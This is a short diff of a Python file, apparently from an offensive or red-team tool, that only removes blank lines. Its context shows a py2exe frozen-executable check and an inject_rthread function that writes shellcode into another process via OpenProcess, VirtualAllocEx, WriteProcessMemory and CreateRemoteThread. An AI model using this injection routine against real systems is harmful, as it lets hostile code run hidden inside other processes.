@@ -47,7 +47,6 @@ def is_frozen_main():
     ThomasHeller posted to the py2exe mailing list
     :return: bool
     """
-
     return (hasattr(sys, "frozen") or  # new py2exe
             hasattr(sys, "importers")  # old py2exe
             or is_frozen("__main__"))  # tools/freeze
@@ -145,14 +144,12 @@ def inject_rthread(shellcode, child_pid):
         hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, bInheritHandle, dwProcessId)
         lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
         write_return = kernel32.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
-
         if write_return != 0:
             kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpBaseAddress,
                                         lpParameter, dwCreationFlags, lpThreadId)
             return True
         else:
             return False
-
     except Exception as e:
         print("ERROR: inject_rthread(): {}".format(e.args))
         return False
